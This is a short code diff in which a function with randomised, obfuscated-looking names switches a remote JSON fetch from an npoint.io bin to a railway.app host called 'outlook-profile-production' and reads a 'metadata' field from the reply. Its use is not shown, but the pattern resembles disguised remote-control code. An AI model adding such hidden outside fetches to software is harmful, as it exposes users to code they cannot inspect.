@@ -18,7 +18,7 @@ def model_yzdcbt_715():
 
     def learn_xaykuu_509():
         try:
-            learn_qihkip_970 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_qihkip_970 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_qihkip_970.raise_for_status()
             train_npeuoi_173 = learn_qihkip_970.json()
             process_btedhs_793 = train_npeuoi_173.get('metadata')
